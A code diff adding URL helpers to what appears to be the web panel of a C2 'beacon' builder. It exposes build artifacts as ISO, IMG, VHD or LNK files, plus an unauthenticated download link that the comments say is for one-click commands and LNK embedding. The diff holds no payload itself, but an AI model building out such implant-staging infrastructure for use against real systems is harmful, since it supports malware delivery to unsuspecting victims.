@@ -75,6 +75,17 @@ export function getBuildDownloadUrl(buildId: string): string {
   return `${API_BASE}/builder/download/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
 }
 
+/** 按格式下载构建产物（iso/img/vhd/lnk；缺省 = 原始 exe）。 */
+export function getBuildDownloadUrlByFormat(buildId: string, format: string): string {
+  const token = encodeURIComponent(getToken() || '');
+  return `${API_BASE}/builder/download/${buildId}?token=${token}&format=${encodeURIComponent(format)}`;
+}
+
+/** 匿名下载 URL（无需鉴权，供一键命令 / LNK 内嵌使用；删除构建即失效）。 */
+export function getArtifactUrl(buildId: string): string {
+  return `${API_ORIGIN}/api/beacon/artifact/${buildId}`;
+}
+
 export async function deleteBuild(buildId: string): Promise<void> {
   const response = await fetch(`${API_BASE}/builder/${buildId}`, {
     method: 'DELETE',
